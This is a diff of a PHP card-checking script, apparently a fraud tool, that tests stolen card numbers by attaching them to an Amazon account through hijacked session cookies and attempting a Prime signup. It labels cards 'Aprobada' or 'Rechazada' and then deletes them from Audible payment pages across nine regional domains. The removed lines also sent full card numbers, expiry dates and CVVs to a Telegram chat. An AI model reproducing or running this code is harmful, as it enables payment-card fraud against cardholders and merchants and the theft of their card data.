+    CURLOPT_URL            => "https://www.$cookieUS1/payments-portal/data/widgets2/v1/customer/".$customerID."/continueWidget",
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_COOKIE         => $cookie2,
+    CURLOPT_ENCODING       => "gzip",
+    CURLOPT_POSTFIELDS     => "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent",
+    CURLOPT_HTTPHEADER     => array(
+        "Host: www.$cookieUS1",
+        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
+        "content-type: application/x-www-form-urlencoded",
+    ),
+]);
+$result = curl_exec($ch);
+curl_close($ch);
+
+$walletid = getstr($result, 'preferencePaymentMethodIds":"[\"','\"');
+
+if ($walletid == null) {
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Fallo al obtener walletid. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+}
+ 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sessionds.'');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+$headers = array();
+$headers[] = 'Host: www.'.$cookieUS1.'';
+$headers[] = 'Cookie: '.$cookie2.'';
+$headers[] = 'Upgrade-Insecure-Requests: 1';
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $Fim = curl_exec($ch);
 curl_close($ch);
 
-// CONSULTA DE BIN
 $urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
 $infobin = file_get_contents($urlbin);
 
-sleep(1); // <--- SLEEP 2 (Para que la limpieza no sea instantánea)
+$tokens = array(
+    "audible.com",
+    "audible.de",
+    "audible.it",
+    "audible.es",
+    "audible.co.uk",
+    "audible.com.au",
+    "audible.ca",
+    "audible.co.jp",
+    "audible.fr"
+);
 
-// ELIMINACIÓN EN AUDIBLE.COM (USA)
-$ch = curl_init();
-curl_setopt_array($ch, [
-    CURLOPT_URL => 'https://www.audible.com/account/payments?ref=',
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_COOKIE => $cookie2,
-    CURLOPT_HTTPHEADER => array('Host: www.audible.com', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
-]);
-$r_aud = curl_exec($ch);
-$csrf_audible = getstr($r_aud, 'data-csrf-token="', '"');
-if (empty($csrf_audible)) {
-    $c_temp = getstr($r_aud, 'data-payment-id="', 'payment-type');
-    $csrf_audible = getstr($c_temp, 'data-csrf-token="', '"');
+foreach ($tokens as $host1111) {
+    $lastDotPosition = strrpos($host1111, '.');
+    if ($lastDotPosition !== false) {
+        $aftehost1111rLastDot = substr($host1111, $lastDotPosition + 1);
+        if ($aftehost1111rLastDot === 'com') {
+            $aftehost1111rLastDot = 'US';
+        }
+    }
+
+    $cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL            => 'https://www.'.$host1111.'/account/payments?ref=',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_COOKIE         => $cookie2,
+        CURLOPT_ENCODING       => "gzip",
+        CURLOPT_POSTFIELDS     => "",
+        CURLOPT_HEADER         => true,
+        CURLOPT_HTTPHEADER     => array(
+            'Host: www.'.$host1111,
+            'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
+            'sec-ch-ua-mobile: ?0',
+            'sec-ch-ua-platform: "Windows"',
+            'Upgrade-Insecure-Requests: 1',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Sec-GPC: 1',
+            'Accept-Language: pt-BR,pt;q=0.9',
+        ),
+    ]);
+    $r = curl_exec($ch);
+    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($httpcode == 429) {
+        continue;
+    }
+
+    $csrf = getstr($r, 'data-csrf-token="', '"');
+    if (stripos($csrf, '///')) {
+        $c = getstr($r, 'data-payment-id="', 'payment-type');
+        $c = getstr($r, 'data-payment-id="', 'payment-type');
+        $csrf = getstr($c, 'data-csrf-token="', '"');
+    }
+    $address = getstr($r, 'data-billing-address-id="', '"');
+    $cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL            => 'https://www.'.$host1111.'/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.'.$host1111.'%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_COOKIE         => $cookie2,
+        CURLOPT_ENCODING       => "gzip",
+        CURLOPT_HEADER         => true,
+        CURLOPT_POSTFIELDS     => "paymentId=".$payment."&billingAddressId=".$address."&paymentType=CreditCard&tail=0433&accountHolderName=Teste&csrfToken=".urlencode($csrf),
+        CURLOPT_HTTPHEADER     => array(
+            'Host: www.'.$host1111,
+            'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
+            'Content-type: application/x-www-form-urlencoded',
+            'X-Requested-With: XMLHttpRequest',
+            'sec-ch-ua-mobile: ?0',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+            'sec-ch-ua-platform: "Windows"',
+            'Accept: */*',
+            'Sec-GPC: 1',
+            'Accept-Language: pt-BR,pt;q=0.9',
+            'Origin: https://www.'.$host1111,
+            'Referer: https://www.'.$host1111.'/account/payments?ref=',
+        ),
+    ]);
+    $r = curl_exec($ch);
+    curl_close($ch);
+
+    if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
+        $msg = '✅';
+        $err = "Eliminado: $msg $err1";
+        break;
+    } else {
+        $msg = '❌';
+        $err = "Eliminado: $msg $err1";
+    }
 }
-$address_audible = getstr($r_aud, 'data-billing-address-id="', '"');
-curl_close($ch);
 
-$ch = curl_init();
-curl_setopt_array($ch, [
-    CURLOPT_URL => 'https://www.audible.com/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_COOKIE => $cookie2,
-    CURLOPT_POSTFIELDS => "paymentId=".$cardid_puro."&billingAddressId=".$address_audible."&paymentType=CreditCard&tail=0433&accountHolderName=Teste&csrfToken=".urlencode($csrf_audible),
-]);
-$r_del = curl_exec($ch);
-curl_close($ch);
+///////////////////////////////////////////////////////////////////////////////////////
 
-if (strpos($r_del, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
-    $msg = '✅';
-    $err = "Eliminado: $msg";
-} else {
-    $msg = '❌';
-    $err = "Eliminado: $msg";
-}
-
-// VARIABLE PARA EL SCRAPPER (FORMATO QUE PEDISTE)
-$bin_corta = substr($cc, 0, 6);
-$scrapp_msg = "⌞ Zhentio/ Scrapp⌝| #BIN($bin_corta)\n";
-$scrapp_msg .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
-$scrapp_msg .= "•| Card: `$cc|$mes|$ano|$cvv`\n";
-$scrapp_msg .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
-$scrapp_msg .= "⼥| Info: " . $infobin . "\n";
-$scrapp_msg .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉";
-
-// VEREDICTO FINAL (CON TUS IFS)
 if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {
-enviarTelegram($scrapp_msg, $token_telegram, $chat_id_telegram);
-die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
-}elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {
-enviarTelegram($scrapp_msg, $token_telegram, $chat_id_telegram);
-die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
-}elseif (strpos($Fim, 'InvalidInput')) {
-die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
-}elseif(strpos($Fim, 'If you would still like to join Prime you can sign up during checkout')) {
-die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Límite de intentos. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
-}elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
-die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+} elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {
+    die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+} elseif (strpos($Fim, 'InvalidInput')) {
+    die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+} elseif(strpos($Fim, 'If you would still like to join Prime you can sign up during checkout')) {
+    die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Límite de intentos. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+} elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
+    die('<span class="text-danger">Rechazada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 } else {
-die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Error interno - Amazon API </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Error interno - Amazon API </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 }
 ?>
